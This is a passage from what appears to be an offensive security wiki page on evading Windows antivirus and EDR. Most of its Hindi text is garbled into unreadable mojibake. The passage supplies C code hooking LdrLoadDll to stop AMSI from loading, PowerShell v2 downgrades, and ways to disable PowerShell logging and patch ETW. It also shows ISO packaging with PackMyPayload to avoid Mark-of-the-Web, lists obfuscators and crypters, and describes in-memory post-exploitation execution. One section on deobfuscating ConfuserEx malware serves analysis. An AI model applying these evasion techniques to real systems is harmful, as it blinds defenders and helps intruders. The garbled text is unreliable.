AMSI рдХреЗрд╡рд▓ рддрдм рдЗрдирд┐рд╢рд┐рдпрд▓рд╛рдЗрдЬрд╝ рд╣реЛрддрд╛ рд╣реИ рдЬрдм `amsi.dll` рд╡рд░реНрддрдорд╛рди рдкреНрд░реЛрд╕реЗрд╕ рдореЗрдВ рд▓реЛрдб рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред рдПрдХ рдордЬрдмреВрдд, рднрд╛рд╖рд╛тАСрдирд┐рд░рдкреЗрдХреНрд╖ bypass рдпрд╣ рд╣реИ рдХрд┐ `ntdll!LdrLoadDll` рдкрд░ рдПрдХ userтАСmode hook рд▓рдЧрд╛рдпрд╛ рдЬрд╛рдП рдЬреЛ рдЕрдиреБрд░реЛрдзрд┐рдд рдореЙрдбреНрдпреВрд▓ `amsi.dll` рд╣реЛрдиреЗ рдкрд░ рдПрдХ рддреНрд░реБрдЯрд┐ рд▓реМрдЯрд╛рдПред рдирддреАрдЬрд╝рддрди, AMSI рдХрднреА рд▓реЛрдб рдирд╣реАрдВ рд╣реЛрддрд╛ рдФрд░ рдЙрд╕ рдкреНрд░реЛрд╕реЗрд╕ рдХреЗ рд▓рд┐рдП рдХреЛрдИ рд╕реНрдХреИрди рдирд╣реАрдВ рд╣реЛрддрд╛ред

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found тЖТ AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14тАСbyte jmp thunk
}
```
Notes
- Works across PowerShell, WScript/CScript and custom loaders alike (anything that would otherwise load AMSI).
- Pair with feeding scripts over stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) to avoid long commandтАСline artefacts.
- Seen used by loaders executed through LOLBins (e.g., `regsvr32` calling `DllRegisterServer`).

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Remove the detected signature**

рдЖрдк рдРрд╕реЗ рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** рдФрд░ **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** рддрд╛рдХрд┐ рд╡рд░реНрддрдорд╛рди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рдореЗрдореЛрд░реА рд╕реЗ рдкрддрд╛ рд▓рдЧрд╛ рд╣реБрдЖ AMSI рд╕рд┐рдЧреНрдиреЗрдЪрд░ рд╣рдЯрд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдпрд╣ рдЯреВрд▓ рд╡рд░реНрддрдорд╛рди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рдореЗрдореЛрд░реА рдореЗрдВ AMSI рд╕рд┐рдЧреНрдиреЗрдЪрд░ рд╕реНрдХреИрди рдХрд░рдХреЗ рдЙрд╕реЗ NOP instructions рд╕реЗ overwrite рдХрд░ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╡рд╣ рдкреНрд░рднрд╛рд╡реА рд░реВрдк рд╕реЗ рдореЗрдореЛрд░реА рд╕реЗ рд╣рдЯ рдЬрд╛рддрд╛ рд╣реИред

**AV/EDR products that uses AMSI**

рдЖрдк **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** рдореЗрдВ AMSI рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ AV/EDR рдЙрддреНрдкрд╛рджреЛрдВ рдХреА рд╕реВрдЪреА рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

**Use Powershell version 2**
рдпрджрд┐ рдЖрдк PowerShell version 2 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ AMSI рд▓реЛрдб рдирд╣реАрдВ рд╣реЛрдЧрд╛, рдЗрд╕рд▓рд┐рдП рдЖрдк рдЕрдкрдиреЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдмрд┐рдирд╛ AMSI рджреНрд╡рд╛рд░рд╛ рд╕реНрдХреИрди рдХрд┐рдП рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдк рдРрд╕рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging рдПрдХ рдлреАрдЪрд░ рд╣реИ рдЬреЛ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдЪрд▓рд╛рдП рдЧрдП рд╕рднреА PowerShell commands рдХреЛ рд▓реЙрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдпрд╣ рдСрдбрд┐рдЯрд┐рдВрдЧ рдФрд░ рдЯреНрд░рдмрд▓рд╢реВрдЯрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рдЙрди attackers рдХреЗ рд▓рд┐рдП рднреА рдПрдХ рд╕рдорд╕реНрдпрд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ detection рд╕реЗ рдмрдЪрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВред

To bypass PowerShell logging, you can use the following techniques:

- **Disable PowerShell Transcription and Module Logging**: рдЖрдк рдЗрд╕рдХреЗ рд▓рд┐рдП рдРрд╕реЗ tool рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs)ред
- **Use Powershell version 2**: рдпрджрд┐ рдЖрдк PowerShell version 2 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ AMSI рд▓реЛрдб рдирд╣реАрдВ рд╣реЛрдЧрд╛, рдЗрд╕рд▓рд┐рдП рдЖрдк рдЕрдкрдиреА scripts рдХреЛ рдмрд┐рдирд╛ AMSI рджреНрд╡рд╛рд░рд╛ рд╕реНрдХреИрди рдХрд┐рдП рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдк рдпрд╣ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Use [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) рддрд╛рдХрд┐ defenses рдХреЗ рдмрд┐рдирд╛ powershell spawn рд╣реЛ (this is what `powerpick` from Cobal Strike uses).


## Obfuscation

> [!TIP]
> рдХрдИ obfuscation techniques рдбреЗрдЯрд╛ рдХреЛ encrypt рдХрд░рдиреЗ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдмрд╛рдЗрдирд░реА рдХрд╛ entropy рдмрдврд╝ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ AVs рддрдерд╛ EDRs рдХреЗ рд▓рд┐рдП рдЗрд╕реЗ detect рдХрд░рдирд╛ рдЖрд╕рд╛рди рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕ рдкрд░ рд╕рд╛рд╡рдзрд╛рдиреА рдмрд░рддреЗрдВ рдФрд░ рд╕рдВрднрд╡рддрдГ encryption рдХреЗрд╡рд▓ рдЙрди рдХреЛрдб рд╕реЗрдХреНрд╢рдиреНрд╕ рдкрд░ рд▓рд╛рдЧреВ рдХрд░реЗрдВ рдЬреЛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реЛрдВ рдпрд╛ рдЫрд┐рдкрд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛред

### Deobfuscating ConfuserEx-Protected .NET Binaries

рдЬрдм рдЖрдк ConfuserEx 2 (рдпрд╛ рдЙрд╕рдХреЗ commercial forks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ malware рдХрд╛ analysis рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдЕрдХреНрд╕рд░ рдХрдИ рд╕реБрд░рдХреНрд╖рд╛ рдкрд░рддреЗрдВ рдорд┐рд▓рддреА рд╣реИрдВ рдЬреЛ decompilers рдФрд░ sandboxes рдХреЛ рд░реЛрдХрддреА рд╣реИрдВред рдиреАрдЪреЗ рджрд┐рдпрд╛ рдЧрдпрд╛ workflow рднрд░реЛрд╕реЗрдордВрдж рддрд░реАрдХреЗ рд╕реЗ рдПрдХ рдХрд░реАрдмтАУрдореВрд▓ IL рдХреЛ restore рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдмрд╛рдж рдореЗрдВ dnSpy рдпрд╛ ILSpy рдЬреИрд╕реЗ tools рдореЗрдВ C# рдореЗрдВ decompile рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

1.  Anti-tampering removal тАУ ConfuserEx рд╣рд░ *method body* рдХреЛ encrypt рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЙрд╕реЗ *module* рдХреЗ static constructor (`<Module>.cctor`) рдХреЗ рдЕрдВрджрд░ decrypt рдХрд░рддрд╛ рд╣реИред рдпрд╣ PE checksum рдХреЛ рднреА patch рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдХреЛрдИ рднреА modification binary рдХреЛ рдХреНрд░реИрд╢ рдХрд░ рджреЗред рдПрдирдХреНрд░рд┐рдкреНрдЯреЗрдб metadata tables рдХреЛ locate рдХрд░рдиреЗ, XOR keys recover рдХрд░рдиреЗ рдФрд░ рдПрдХ clean assembly rewrite рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **AntiTamperKiller** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output рдореЗрдВ 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ рдЕрдкрдиреА рдЦреБрдж рдХреА unpacker рдмрдирд╛рддреЗ рд╕рдордп рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред

2.  Symbol / control-flow recovery тАУ *clean* рдлрд╝рд╛рдЗрд▓ рдХреЛ **de4dot-cex** (de4dot рдХрд╛ ConfuserEx-aware fork) рдХреЛ рджреЗрдВ:
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
тАв `-p crx` тАУ ConfuserEx 2 рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рдЪреБрдиреЗрдВ  
тАв de4dot control-flow flattening рдХреЛ undo рдХрд░реЗрдЧрд╛, рдореВрд▓ namespaces, classes рдФрд░ variable names рдХреЛ restore рдХрд░реЗрдЧрд╛ рдФрд░ constant strings рдХреЛ decrypt рдХрд░реЗрдЧрд╛ред

3.  Proxy-call stripping тАУ ConfuserEx direct method calls рдХреЛ lightweight wrappers (a.k.a *proxy calls*) рд╕реЗ рдмрджрд▓ рджреЗрддрд╛ рд╣реИ рддрд╛рдХрд┐ decompilation рдФрд░ рдЕрдзрд┐рдХ рдореБрд╢реНрдХрд┐рд▓ рд╣реЛред рдЗрдиреНрд╣реЗрдВ рд╣рдЯрд╛рдиреЗ рдХреЗ рд▓рд┐рдП **ProxyCall-Remover** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
рдЗрд╕ рдХрджрдо рдХреЗ рдмрд╛рдж рдЖрдк opaque wrapper functions (`Class8.smethod_10`, тАж) рдХреА рдЬрдЧрд╣ рд╕рд╛рдорд╛рдиреНрдп .NET API рдЬреИрд╕реЗ `Convert.FromBase64String` рдпрд╛ `AES.Create()` рджреЗрдЦ рдкрд╛рдПрдВрдЧреЗред

4.  Manual clean-up тАУ resulting binary рдХреЛ dnSpy рдореЗрдВ рдЪрд▓рд╛рдПрдБ, рдмрдбрд╝реЗ Base64 blobs рдпрд╛ `RijndaelManaged`/`TripleDESCryptoServiceProvider` рдХреЗ рдЙрдкрдпреЛрдЧ рдХреЛ рдЦреЛрдЬреЗрдВ рддрд╛рдХрд┐ рд╡рд╛рд╕реНрддрд╡рд┐рдХ payload рдорд┐рд▓ рд╕рдХреЗред рдЕрдХреНрд╕рд░ malware рдЗрд╕реЗ `<Module>.byte_0` рдХреЗ рдЕрдВрджрд░ TLV-encoded byte array рдХреЗ рд░реВрдк рдореЗрдВ рд╕реНрдЯреЛрд░ рдХрд░рддрд╛ рд╣реИред

рдЙрдкрд░реНрдпреБрдХреНрдд рдЪреИрди рдЙрд╕ malicious sample рдХреЛ рдЪрд▓рд╛рдП рдмрд┐рдирд╛ execution flow рдХреЛ restore рдХрд░рддреА рд╣реИ тАФ рдпрд╣ offline workstation рдкрд░ рдХрд╛рдо рдХрд░рддреЗ рд╕рдордп рдЙрдкрдпреЛрдЧреА рд╣реИред

> ЁЯЫИ  ConfuserEx рдПрдХ custom attribute `ConfusedByAttribute` рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ IOC рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░ samples рдХреЛ automatically triage рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): рдЗрд╕ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп [LLVM](http://www.llvm.org/) compilation suite рдХрд╛ рдПрдХ open-source fork рдкреНрд░рджрд╛рди рдХрд░рдирд╛ рд╣реИ рдЬреЛ [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) рдФрд░ tamper-proofing рдХреЗ рдЬрд░рд┐рдП рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рд╕реБрд░рдХреНрд╖рд╛ рдмрдврд╝рд╛ рд╕рдХреЗред
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator рдпрд╣ рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдХрд┐ рдХрд┐рд╕ рддрд░рд╣ `C++11/14` рднрд╛рд╖рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, compile time рдкрд░, рдХрд┐рд╕реА рдмрд╛рд╣рд░реА рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдмрд┐рдирд╛ рдФрд░ compiler рдХреЛ modify рдХрд┐рдП рдмрд┐рдирд╛ obfuscated code generate рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework рджреНрд╡рд╛рд░рд╛ generate рдХрд┐рдП рдЧрдП obfuscated operations рдХреА рдПрдХ рдкрд░рдд рдЬреЛрдбрд╝рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ application рдХреНрд░реИрдХ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдХреА рдЬрд╝рд┐рдиреНрджрдЧреА рдереЛрдбрд╝реА рдХрдард┐рди рд╣реЛ рдЬрд╛рдПрдЧреАред
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz рдПрдХ x64 binary obfuscator рд╣реИ рдЬреЛ рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рдХрд╛рд░ рдХреА pe files рдЬреИрд╕реЗ: .exe, .dll, .sys рдХреЛ obfuscate рдХрд░ рд╕рдХрддрд╛ рд╣реИред
- [**metame**](https://github.com/a0rtega/metame): Metame arbitrary executables рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рд░рд▓ metamorphic code engine рд╣реИред
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator рдПрдХ fine-grained code obfuscation framework рд╣реИ рдЬреЛ ROP (return-oriented programming) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ LLVM-supported рднрд╛рд╖рд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдХрд╛рдо рдХрд░рддрд╛ рд╣реИред ROPfuscator рдирд┐рдпрдорд┐рдд рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХреЛ ROP chains рдореЗрдВ рдмрджрд▓рдХрд░ assembly code рд╕реНрддрд░ рдкрд░ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ obfuscate рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╕рд╛рдорд╛рдиреНрдп control flow рдХреА рд╣рдорд╛рд░реА рдкрд╛рд░рдВрдкрд░рд┐рдХ рд╕рдордЭ рдмрд╛рдзрд┐рдд рд╣реЛрддреА рд╣реИред
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt Nim рдореЗрдВ рд▓рд┐рдЦрд╛ рдЧрдпрд╛ рдПрдХ .NET PE Crypter рд╣реИ
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor рдореМрдЬреВрджрд╛ EXE/DLL рдХреЛ shellcode рдореЗрдВ convert рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдЙрдиреНрд╣реЗрдВ load рдХрд░рддрд╛ рд╣реИ

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen рдореБрдЦреНрдпрддрдГ reputation-based approach рдкрд░ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдХрдо рдмрд╛рд░ download рд╣реБрдП applications SmartScreen рдХреЛ trigger рдХрд░реЗрдВрдЧреЗ, рдЬрд┐рд╕рд╕реЗ end user рдХреЛ рдЕрд▓рд░реНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдлрд╝рд╛рдЗрд▓ рдХреЛ execute рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрд╛ рдЬрд╛рдПрдЧрд╛ (рд╣рд╛рд▓рд╛рдБрдХрд┐ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЕрднреА рднреА More Info -> Run anyway рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рдХреЗ рдЪрд▓рд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ)ред

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>рдЗрдВрдЯрд░рдиреЗрдЯ рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХреА рд╣реБрдИ рдлрд╝рд╛рдЗрд▓ рдХреЗ рд▓рд┐рдП Zone.Identifier ADS рдХреА рдЬрд╛рдБрдЪред</p></figcaption></figure>

> [!TIP]
> рдзреНрдпрд╛рди рджреЗрдиреЗ рдпреЛрдЧреНрдп рд╣реИ рдХрд┐ executables рдЬреЛ **trusted** signing certificate рдХреЗ рд╕рд╛рде sign рдХрд┐рдП рдЧрдП рд╣реЛрдВ, рд╡реЗ **SmartScreen рдХреЛ trigger рдирд╣реАрдВ рдХрд░реЗрдВрдЧреЗ**ред

A very effective way to prevent your payloads from getting the Mark of The Web is by packaging them inside some sort of container like an ISO. This happens because Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) рдПрдХ tool рд╣реИ рдЬреЛ payloads рдХреЛ output containers рдореЗрдВ package рдХрд░рдХреЗ Mark-of-the-Web рд╕реЗ рдмрдЪрдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддрд╛ рд╣реИред

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) Windows рдореЗрдВ рдПрдХ рд╢рдХреНрддрд┐рд╢рд╛рд▓реА рд▓реЙрдЧрд┐рдВрдЧ рдореЗрдХреЗрдирд┐рдЬреНрдо рд╣реИ рдЬреЛ applications рдФрд░ system components рдХреЛ **рдШрдЯрдирд╛рдУрдВ рдХреЛ рд▓реЙрдЧ рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдЗрд╕реЗ security products рджреНрд╡рд╛рд░рд╛ malicious рдЧрддрд┐рд╡рд┐рдзрд┐рдпреЛрдВ рдХреА рдирд┐рдЧрд░рд╛рдиреА рдФрд░ рдкрд╣рдЪрд╛рди рдХреЗ рд▓рд┐рдП рднреА рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЬрд┐рд╕ рддрд░рд╣ AMSI рдХреЛ disabled (bypassed) рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЙрд╕реА рддрд░рд╣ user space process рдХреЗ **`EtwEventWrite`** рдлрдВрдХреНрд╢рди рдХреЛ рдмрд┐рдирд╛ рдХрд┐рд╕реА рдЗрд╡реЗрдВрдЯ рдХреЛ рд▓реЙрдЧ рдХрд┐рдП рддреБрд░рдВрдд return рдХрд░рд╛рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рднреА рд╣реИред рдпрд╣ рдлрдВрдХреНрд╢рди рдХреЛ рдореЗрдореЛрд░реА рдореЗрдВ patch рдХрд░рдХреЗ рд╕реАрдзреЗ return рдХрд░рд╡рд╛ рдХрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЙрд╕ рдкреНрд░реЛрд╕реЗрд╕ рдХреЗ рд▓рд┐рдП ETW logging рдкреНрд░рднрд╛рд╡реА рд░реВрдк рд╕реЗ disabled рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред

You can find more info in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

C# рдмрд╛рдЗрдирд░реАрдЬрд╝ рдХреЛ рдореЗрдореЛрд░реА рдореЗрдВ рд▓реЛрдб рдХрд░рдирд╛ рдХрд╛рдлреА рд╕рдордп рд╕реЗ рдЬрд╛рдирд╛ рд╣реБрдЖ рддрд░реАрдХрд╛ рд╣реИ рдФрд░ рдпрд╣ рдЕрднреА рднреА рдЖрдкрдХреЗ post-exploitation рдЯреВрд▓реНрд╕ рдХреЛ AV рджреНрд╡рд╛рд░рд╛ рдкрдХрдбрд╝реЗ рдмрд┐рдирд╛ рдЪрд▓рд╛рдиреЗ рдХрд╛ рдПрдХ рдмрд╣реБрдд рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реИред

рдЪреВрдБрдХрд┐ payload рд╕реАрдзреЗ рдореЗрдореЛрд░реА рдореЗрдВ рд▓реЛрдб рд╣реЛрдЧрд╛ рдФрд░ рдбрд┐рд╕реНрдХ рдХреЛ рдирд╣реАрдВ рдЫреБрдПрдЧрд╛, рд╣рдореЗрдВ рдкреВрд░реЗ рдкреНрд░реЛрд╕реЗрд╕ рдХреЗ рд▓рд┐рдП рдХреЗрд╡рд▓ AMSI рдХреЛ patch рдХрд░рдиреЗ рдХреА рдЪрд┐рдВрддрд╛ рдХрд░рдиреА рд╣реЛрдЧреАред

Most C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) already provide the ability to execute C# assemblies directly in memory, but there are different ways of doing so:

- **Fork\&Run**

рдпрд╣ рдПрдХ рдирдП sacrificial process рдХреЛ spawn рдХрд░рдирд╛ рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИ, рдЙрд╕ рдирдП рдкреНрд░реЛрд╕реЗрд╕ рдореЗрдВ рдЖрдкрдХрд╛ post-exploitation malicious code inject рдХрд░рдирд╛, рдЖрдкрдХрд╛ malicious code execute рдХрд░рдирд╛ рдФрд░ рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рдкрд░ рдЙрд╕ рдирдП рдкреНрд░реЛрд╕реЗрд╕ рдХреЛ kill рдХрд░ рджреЗрдирд╛ред рдЗрд╕рд╕реЗ рдлрд╛рдпрджреЗ рдФрд░ рдиреБрдХрд╕рд╛рди рджреЛрдиреЛрдВ рд╣реЛрддреЗ рд╣реИрдВред Fork and run рд╡рд┐рдзрд┐ рдХрд╛ рдлрд╛рдпрджрд╛ рдпрд╣ рд╣реИ рдХрд┐ execution рд╣рдорд╛рд░реЗ Beacon implant process рдХреЗ **outside** рд╣реЛрддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдпрджрд┐ рд╣рдорд╛рд░реА рдХрд┐рд╕реА post-exploitation рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдХреБрдЫ рдЧрд▓рдд рд╣реЛрддрд╛ рд╣реИ рдпрд╛ рдкрдХрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рд╣рдорд╛рд░реЗ **implant surviving** рдХреА **рдХрд╛рдлреА рдЕрдзрд┐рдХ рд╕рдВрднрд╛рд╡рдирд╛** рд░рд╣рддреА рд╣реИред рдиреБрдХрд╕рд╛рди рдпрд╣ рд╣реИ рдХрд┐ Behavioural Detections рджреНрд╡рд╛рд░рд╛ рдкрдХрдбрд╝реЗ рдЬрд╛рдиреЗ рдХреА **рдЕрдзрд┐рдХ рд╕рдВрднрд╛рд╡рдирд╛** рд░рд╣рддреА рд╣реИред

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

